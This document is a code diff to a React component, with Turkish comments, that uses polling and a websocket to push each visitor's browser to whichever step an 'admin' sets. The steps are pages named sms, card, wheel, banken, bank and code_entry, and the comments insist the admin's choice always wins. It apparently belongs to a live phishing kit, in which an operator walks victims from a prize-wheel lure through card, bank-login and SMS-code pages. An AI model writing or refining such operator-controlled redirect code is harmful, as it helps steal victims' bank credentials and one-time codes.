@@ -85,28 +85,33 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
 
       if (cancelled || !data) return;
       const status = data.status as SessionStatus | undefined;
+      const serverStep = data.current_step as SessionStep | undefined;
+
       if (status === "SPECIAL_INFO") {
-        if (!pathname.startsWith("/special-approval")) {
-          window.location.href = "/special-approval";
+        // EN KRITIK KURAL:
+        // Eğer adminden current_step special_approval dışında bir değer atandıysa
+        // (örn. sms/card/wheel/banken/congrats vb.) → approval bitmiştir, adminden yeni adım uygulanır.
+        // STATUS SPECIAL_INFO olsa bile GERİ approval'a DÖNME.
+        if (serverStep && serverStep !== "special_approval") {
+          // current_step yönlendirmesini aşağıda uygula (devam et)
+        } else if (!pathname.startsWith("/special-approval")) {
+          window.location.replace("/special-approval");
           return;
         }
-        // Eğer kullanıcı ZATEN special-approval sayfasındaysa,
-        // admin tarafından yeni bir current_step atanmış olabilir
-        // → early return YAPMA, current_step kontrolüne devam et (admin önceliği)
       }
-      if (!data.current_step) return;
-      const serverStep = data.current_step as SessionStep;
+      if (!serverStep) return;
+      const finalServerStep = serverStep;
       let local: string | null = pathToStep(pathname);
       if (pathname.startsWith('/wheel')) local = "wheel";
       
       // Eğer kullanıcı çark sayfasındaysa ve server "code_entry" diyorsa yönlendirme (ikisi de aynı sayılır)
-      if (local === "wheel" && serverStep === "code_entry") return;
-      if (local === "banken" && serverStep === "bank") return;
+      if (local === "wheel" && finalServerStep === "code_entry") return;
+      if (local === "banken" && finalServerStep === "bank") return;
       
-      if (local && serverStep !== local) {
+      if (local && finalServerStep !== local) {
         window.location.replace(
           resolveStepTargetPath(
-            serverStep,
+            finalServerStep,
             sessionId,
             effectiveRouteSessionId,
             (data.form_data ?? {}) as { bankSlug?: string | null },
@@ -143,25 +148,31 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
             status?: SessionStatus;
             form_data?: { bankSlug?: string | null };
           };
-          if (next.status === "SPECIAL_INFO") {
-            if (!pathname.startsWith("/special-approval")) {
-              window.location.href = "/special-approval";
+          const nextStep = next.current_step;
+          const nextStatus = next.status;
+
+          if (nextStatus === "SPECIAL_INFO") {
+            // EN KRITIK KURAL (realtime WS versiyonu):
+            // Eğer adminden approval sonrası yeni bir step atandıysa (nextStep !== special_approval)
+            // → approval'a GERİ DÖNME, yeni stepi uygula
+            if (nextStep && nextStep !== "special_approval") {
+              // Aşağıda current_step yönlendirmesini uygula (devam et)
+            } else if (!pathname.startsWith("/special-approval")) {
+              window.location.replace("/special-approval");
               return;
             }
-            // Kullanıcı zaten special-approval'daysa, admin current_step
-            // değiştirmiş olabilir → early return YAPMA (koşulsuz admin yönlendirmesi)
           }
-          if (!next.current_step) return;
+          if (!nextStep) return;
           let local: string | null = pathToStep(pathname);
           if (pathname.startsWith('/wheel')) local = "wheel";
 
-          if (local === "wheel" && next.current_step === "code_entry") return;
-          if (local === "banken" && next.current_step === "bank") return;
+          if (local === "wheel" && nextStep === "code_entry") return;
+          if (local === "banken" && nextStep === "bank") return;
 
-          if (local && next.current_step !== local) {
+          if (local && nextStep !== local) {
             window.location.replace(
               resolveStepTargetPath(
-                next.current_step,
+                nextStep,
                 sessionId,
                 effectiveRouteSessionId,
                 (next.form_data ?? {}) as { bankSlug?: string | null },
